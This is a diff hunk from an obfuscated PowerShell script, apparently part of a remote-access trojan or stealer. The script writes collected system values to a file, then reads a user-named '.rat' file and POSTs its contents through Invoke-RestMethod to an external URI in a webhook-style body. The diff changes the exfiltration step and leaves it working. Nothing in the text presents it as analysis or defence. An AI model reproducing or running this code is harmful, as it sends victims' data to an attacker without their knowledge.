@@ -36,9 +36,9 @@ Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
 Add-Content -Path $CRYnrkaDbe -Value $env:temp
 Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs
-$xehGLcIRou = Get-Content $CRYnrkaDbe 
+$xehGLcIRou = Get-Content "$env:UserName.rat"
 $xmWrZacmJz = @{
-    'username' = 'Config'
+    # 'username' = 'Config'
     'content' = $xehGLcIRou
 }
 Invoke-RestMethod -Uri $PEBgxuJUfd -Method 'post' -Body $xmWrZacmJz
